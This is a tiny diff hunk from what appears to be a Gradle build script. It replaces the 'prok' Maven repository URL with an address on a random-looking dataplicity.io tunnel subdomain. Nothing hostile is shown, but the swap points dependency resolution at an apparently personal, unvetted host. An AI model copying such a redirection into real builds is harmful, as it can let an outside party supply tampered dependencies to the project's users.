@@ -319,7 +319,7 @@ repositories {
     clear()
     maven {
         name 'prok'
-        url 'https://repo.prok.pw/'
+        url 'https://glairiest-walrus-3867.dataplicity.io/thermoslibs/'
     }
     maven {
         name 'forge'
